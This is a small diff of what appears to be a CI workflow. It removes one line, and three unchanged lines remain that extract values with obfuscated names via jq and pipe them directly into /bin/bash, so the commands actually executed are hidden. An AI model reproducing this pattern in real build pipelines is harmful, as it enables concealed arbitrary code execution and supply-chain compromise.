@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$rn6" | jq -r .h443 | /bin/bash
           echo $t0 | jq -r .raie9849 | /bin/bash
           printf '%s' "$us114" | jq -r .reyb5565 | /bin/bash
-          echo $ey356 | jq -r .zj4942 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
